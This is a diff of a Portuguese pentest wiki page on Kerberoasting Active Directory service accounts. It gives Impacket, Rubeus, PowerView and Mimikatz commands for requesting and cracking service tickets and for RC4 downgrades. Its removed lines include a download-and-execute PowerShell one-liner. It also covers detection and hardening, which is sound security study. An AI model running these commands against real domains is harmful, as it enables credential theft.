@@ -4,172 +4,215 @@
 
 ## Kerberoast
 
-Kerberoasting foca na aquisição de **TGS tickets**, especificamente aqueles relacionados a serviços operando sob **contas de usuário** no **Active Directory (AD)**, excluindo **contas de computador**. A criptografia desses tickets utiliza chaves que originam de **senhas de usuário**, permitindo a possibilidade de **cracking de credenciais offline**. O uso de uma conta de usuário como serviço é indicado por uma propriedade **"ServicePrincipalName"** não vazia.
+Kerberoasting foca na aquisição de tickets TGS, especificamente aqueles relacionados a serviços operando sob contas de usuário no Active Directory (AD), excluindo contas de computador. A criptografia desses tickets utiliza chaves que se originam das senhas dos usuários, permitindo a quebra de credenciais offline. O uso de uma conta de usuário como serviço é indicado por uma propriedade ServicePrincipalName (SPN) não vazia.
 
-Para executar **Kerberoasting**, é essencial uma conta de domínio capaz de solicitar **TGS tickets**; no entanto, esse processo não exige **privilégios especiais**, tornando-o acessível a qualquer um com **credenciais de domínio válidas**.
+Qualquer usuário autenticado do domínio pode solicitar tickets TGS, portanto, não são necessárias permissões especiais.
 
-### Pontos Chave:
+### Pontos Chave
 
-- **Kerberoasting** visa **TGS tickets** para **serviços de conta de usuário** dentro do **AD**.
-- Tickets criptografados com chaves de **senhas de usuário** podem ser **crackeados offline**.
-- Um serviço é identificado por um **ServicePrincipalName** que não é nulo.
-- **Nenhum privilégio especial** é necessário, apenas **credenciais de domínio válidas**.
-
-### **Ataque**
+- Alvo são tickets TGS para serviços que rodam sob contas de usuário (ou seja, contas com SPN definido; não contas de computador).
+- Os tickets são criptografados com uma chave derivada da senha da conta de serviço e podem ser quebrados offline.
+- Nenhuma permissão elevada é necessária; qualquer conta autenticada pode solicitar tickets TGS.
 
 > [!WARNING]
-> **Ferramentas de Kerberoasting** normalmente solicitam **`RC4 encryption`** ao realizar o ataque e iniciar solicitações TGS-REQ. Isso ocorre porque **RC4 é** [**mais fraco**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) e mais fácil de crackear offline usando ferramentas como Hashcat do que outros algoritmos de criptografia, como AES-128 e AES-256.\
-> Hashes RC4 (tipo 23) começam com **`$krb5tgs$23$*`** enquanto AES-256 (tipo 18) começam com **`$krb5tgs$18$*`**.` 
-> Além disso, tenha cuidado porque `Rubeus.exe kerberoast` solicita tickets automaticamente sobre TODAS as contas vulneráveis, o que pode te fazer ser detectado. Primeiro, encontre usuários kerberoastable com privilégios interessantes e então execute apenas sobre eles.
-```bash
+> A maioria das ferramentas públicas prefere solicitar tickets de serviço RC4-HMAC (tipo 23) porque são mais rápidos de quebrar do que AES. Hashes TGS RC4 começam com `$krb5tgs$23$*`, AES128 com `$krb5tgs$17$*`, e AES256 com `$krb5tgs$18$*`. No entanto, muitos ambientes estão migrando para apenas AES. Não assuma que apenas RC4 é relevante.
+> Além disso, evite o "spray-and-pray" na técnica de roasting. O kerberoast padrão do Rubeus pode consultar e solicitar tickets para todos os SPNs e é barulhento. Enumere e direcione os princípios interessantes primeiro.
 
-#### **Linux**
-
-```bash
-# Metasploit framework
-msf> use auxiliary/gather/get_user_spns
-# Impacket
-GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # A senha será solicitada
-GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
-# kerberoast: https://github.com/skelsec/kerberoast
-kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerar usuários kerberoastable
-kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Extrair hashes
-```
-
-Multi-features tools including a dump of kerberoastable users:
-
-```bash
-# ADenum: https://github.com/SecuProject/ADenum
-adenum -d <DOMÍNIO.COMPLETO> -ip <DC_IP> -u <NOME_DE_USUÁRIO> -p <SENHA> -c
-```
-
-#### Windows
-
-- **Enumerate Kerberoastable users**
-
-```bash
-# Obter usuários Kerberoastable
-setspn.exe -Q */* #Este é um binário embutido. Concentre-se nas contas de usuário
-Get-NetUser -SPN | select serviceprincipalname #Powerview
-.\Rubeus.exe kerberoast /stats
-```
-
-- **Technique 1: Ask for TGS and dump it from memory**
-
-```bash
-#Obter TGS na memória de um único usuário
-Add-Type -AssemblyName System.IdentityModel
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Exemplo: MSSQLSvc/mgmt.domain.local
-
-#Obter TGSs para TODAS as contas kerberoastable (PCs incluídos, não é muito inteligente)
-setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
-
-#Listar tickets kerberos na memória
-klist
-
-# Extraí-los da memória
-Invoke-Mimikatz -Command '"kerberos::list /export"' #Exportar tickets para a pasta atual
-
-# Transformar ticket kirbi para john
-python2.7 kirbi2john.py sqldev.kirbi
-# Transformar john para hashcat
-sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
-```
-
-- **Technique 2: Automatic tools**
-
-```bash
-# Powerview: Obter hash Kerberoast de um usuário
-Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Usando PowerView Ex: MSSQLSvc/mgmt.domain.local
-# Powerview: Obter todos os hashes Kerberoast
-Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation
-
-# Rubeus
-.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
-.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Usuário específico
-.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Obter administradores
-
-# Invoke-Kerberoast
-iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
-Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
-```
-
-> [!WARNING]
-> When a TGS is requested, Windows event `4769 - A Kerberos service ticket was requested` is generated.
-
-### Cracking
-
-```bash
-john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast  
-hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt  
-./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
-```
-
-### Persistence
-
-If you have **enough permissions** over a user you can **make it kerberoastable**:
-
-```bash
-Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
-```
-
-You can find useful **tools** for **kerberoast** attacks here: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
-
-If you find this **error** from Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** it because of your local time, you need to synchronise the host with the DC. There are a few options:
-
-- `ntpdate <IP of DC>` - Deprecated as of Ubuntu 16.04
-- `rdate -n <IP of DC>`
-
-### Mitigation
-
-Kerberoasting can be conducted with a high degree of stealthiness if it is exploitable. In order to detect this activity, attention should be paid to **Security Event ID 4769**, which indicates that a Kerberos ticket has been requested. However, due to the high frequency of this event, specific filters must be applied to isolate suspicious activities:
-
-- The service name should not be **krbtgt**, as this is a normal request.
-- Service names ending with **$** should be excluded to avoid including machine accounts used for services.
-- Requests from machines should be filtered out by excluding account names formatted as **machine@domain**.
-- Only successful ticket requests should be considered, identified by a failure code of **'0x0'**.
-- **Most importantly**, the ticket encryption type should be **0x17**, which is often used in Kerberoasting attacks.
-
-```bash
-Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
-```
-
-To mitigate the risk of Kerberoasting:
-
-- Ensure that **Service Account Passwords are difficult to guess**, recommending a length of more than **25 characters**.
-- Utilize **Managed Service Accounts**, which offer benefits like **automatic password changes** and **delegated Service Principal Name (SPN) Management**, enhancing security against such attacks.
-
-By implementing these measures, organizations can significantly reduce the risk associated with Kerberoasting.
-
-## Kerberoast w/o domain account
-
-In **September 2022**, a new way to exploit a system was brought to light by a researcher named Charlie Clark, shared through his platform [exploit.ph](https://exploit.ph/). This method allows for the acquisition of **Service Tickets (ST)** via a **KRB_AS_REQ** request, which remarkably does not necessitate control over any Active Directory account. Essentially, if a principal is set up in such a way that it doesn't require pre-authentication—a scenario similar to what's known in the cybersecurity realm as an **AS-REP Roasting attack**—this characteristic can be leveraged to manipulate the request process. Specifically, by altering the **sname** attribute within the request's body, the system is deceived into issuing a **ST** rather than the standard encrypted Ticket Granting Ticket (TGT).
-
-The technique is fully explained in this article: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
-
-> [!WARNING]
-> You must provide a list of users because we don't have a valid account to query the LDAP using this technique.
+### Ataque
 
 #### Linux
-
-- [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
-
 ```bash
-GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
-```
+# Metasploit Framework
+msf> use auxiliary/gather/get_user_spns
 
+# Impacket — request and save roastable hashes (prompts for password)
+GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
+# With NT hash
+GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
+# Target a specific user’s SPNs only (reduce noise)
+GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>
+
+# kerberoast by @skelsec (enumerate and roast)
+# 1) Enumerate kerberoastable users via LDAP
+kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
+# 2) Request TGS for selected SPNs and dump
+kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
+```
+Ferramentas multifuncionais, incluindo verificações de kerberoast:
+```bash
+# ADenum: https://github.com/SecuProject/ADenum
+adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
+```
 #### Windows
 
-- [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):
+- Enumerar usuários kerberoastable
+```powershell
+# Built-in
+setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)
 
-```bash
-Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
+# PowerView
+Get-NetUser -SPN | Select-Object serviceprincipalname
+
+# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
+.\Rubeus.exe kerberoast /stats
 ```
+- Técnica 1: Solicitar TGS e despejar da memória
+```powershell
+# Acquire a single service ticket in memory for a known SPN
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local
 
-## References
+# Get all cached Kerberos tickets
+klist
+
+# Export tickets from LSASS (requires admin)
+Invoke-Mimikatz -Command '"kerberos::list /export"'
+
+# Convert to cracking formats
+python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
+# Optional: convert john -> hashcat etype23 if needed
+sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
+```
+- Técnica 2: Ferramentas automáticas
+```powershell
+# PowerView — single SPN to hashcat format
+Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
+# PowerView — all user SPNs -> CSV
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation
+
+# Rubeus — default kerberoast (be careful, can be noisy)
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+# Rubeus — target a single account
+.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
+# Rubeus — target admins only
+.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
+```
+> [!WARNING]
+> Um pedido de TGS gera o Evento de Segurança do Windows 4769 (Um ticket de serviço Kerberos foi solicitado).
+
+### OPSEC e ambientes apenas com AES
+
+- Solicite RC4 de propósito para contas sem AES:
+- Rubeus: `/rc4opsec` usa tgtdeleg para enumerar contas sem AES e solicita tickets de serviço RC4.
+- Rubeus: `/tgtdeleg` com kerberoast também aciona solicitações RC4 onde possível.
+- Torre contas apenas com AES em vez de falhar silenciosamente:
+- Rubeus: `/aes` enumera contas com AES habilitado e solicita tickets de serviço AES (tipo 17/18).
+- Se você já possui um TGT (PTT ou de um .kirbi), pode usar `/ticket:<blob|path>` com `/spn:<SPN>` ou `/spns:<file>` e pular o LDAP.
+- Direcionamento, limitação e menos ruído:
+- Use `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` e `/jitter:<1-100>`.
+- Filtre por senhas provavelmente fracas usando `/pwdsetbefore:<MM-dd-yyyy>` (senhas mais antigas) ou direcione OUs privilegiadas com `/ou:<DN>`.
+
+Exemplos (Rubeus):
+```powershell
+# Kerberoast only AES-enabled accounts
+.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
+# Request RC4 for accounts without AES (downgrade via tgtdeleg)
+.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
+# Roast a specific SPN with an existing TGT from a non-domain-joined host
+.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
+```
+### Quebra
+```bash
+# John the Ripper
+john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast
+
+# Hashcat
+# RC4-HMAC (etype 23)
+hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
+# AES128-CTS-HMAC-SHA1-96 (etype 17)
+hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
+# AES256-CTS-HMAC-SHA1-96 (etype 18)
+hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
+```
+### Persistência / Abuso
+
+Se você controla ou pode modificar uma conta, pode torná-la kerberoastable adicionando um SPN:
+```powershell
+Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
+```
+Rebaixar uma conta para habilitar RC4 para facilitar a quebra (requer privilégios de escrita no objeto alvo):
+```powershell
+# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
+Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
+# Mixed RC4+AES (value 28)
+Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
+```
+Você pode encontrar ferramentas úteis para ataques de kerberoast aqui: https://github.com/nidem/kerberoast
+
+Se você encontrar este erro do Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` é devido ao desvio de hora local. Sincronize com o DC:
+
+- `ntpdate <DC_IP>` (obsoleto em algumas distribuições)
+- `rdate -n <DC_IP>`
+
+### Detecção
+
+Kerberoasting pode ser furtivo. Procure pelo ID de Evento 4769 dos DCs e aplique filtros para reduzir o ruído:
+
+- Exclua o nome do serviço `krbtgt` e nomes de serviços que terminam com `$` (contas de computador).
+- Exclua solicitações de contas de máquina (`*$$@*`).
+- Apenas solicitações bem-sucedidas (Código de Falha `0x0`).
+- Acompanhe os tipos de criptografia: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Não alerte apenas sobre `0x17`.
+
+Exemplo de triagem PowerShell:
+```powershell
+Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
+Where-Object {
+($_.Message -notmatch 'krbtgt') -and
+($_.Message -notmatch '\$$') -and
+($_.Message -match 'Failure Code:\s+0x0') -and
+($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
+($_.Message -notmatch '\$@')
+} |
+Select-Object -ExpandProperty Message
+```
+Ideias adicionais:
+
+- Estabeleça um uso normal de SPN por host/usuário; alerta sobre grandes picos de solicitações distintas de SPN de um único principal.
+- Marque o uso incomum de RC4 em domínios com AES endurecido.
+
+### Mitigação / Endurecimento
+
+- Use gMSA/dMSA ou contas de máquina para serviços. Contas gerenciadas têm senhas aleatórias de mais de 120 caracteres e giram automaticamente, tornando a quebra offline impraticável.
+- Aplique AES em contas de serviço definindo `msDS-SupportedEncryptionTypes` para apenas AES (decimal 24 / hex 0x18) e, em seguida, gire a senha para que as chaves AES sejam derivadas.
+- Sempre que possível, desative o RC4 em seu ambiente e monitore tentativas de uso de RC4. Em DCs, você pode usar o valor de registro `DefaultDomainSupportedEncTypes` para direcionar padrões para contas sem `msDS-SupportedEncryptionTypes` definido. Teste minuciosamente.
+- Remova SPNs desnecessários de contas de usuário.
+- Use senhas longas e aleatórias para contas de serviço (25+ caracteres) se contas gerenciadas não forem viáveis; proíba senhas comuns e audite regularmente.
+
+### Kerberoast sem uma conta de domínio (STs solicitados por AS)
+
+Em setembro de 2022, Charlie Clark mostrou que se um principal não requer pré-autenticação, é possível obter um ticket de serviço via um KRB_AS_REQ elaborado alterando o sname no corpo da solicitação, efetivamente obtendo um ticket de serviço em vez de um TGT. Isso espelha o AS-REP roasting e não requer credenciais de domínio válidas.
+
+Veja os detalhes: Semperis write-up “New Attack Paths: AS-requested STs”.
+
+> [!WARNING]
+> Você deve fornecer uma lista de usuários porque, sem credenciais válidas, não é possível consultar o LDAP com esta técnica.
+
+Linux
+
+- Impacket (PR #1413):
+```bash
+GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
+```
+Windows
+
+- Rubeus (PR #139):
+```powershell
+Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
+```
+Relacionado
+
+Se você está visando usuários que podem ser alvo de AS-REP roastable, veja também:
+
+{{#ref}}
+asreproast.md
+{{#endref}}
+
+## Referências
 
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
+- Microsoft Security Blog (2024-10-11) – Orientações da Microsoft para ajudar a mitigar o Kerberoasting: https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/
+- SpecterOps – Documentação do Rubeus Roasting: https://docs.specterops.io/ghostpack/rubeus/roasting
 
 {{#include ../../banners/hacktricks-training.md}}
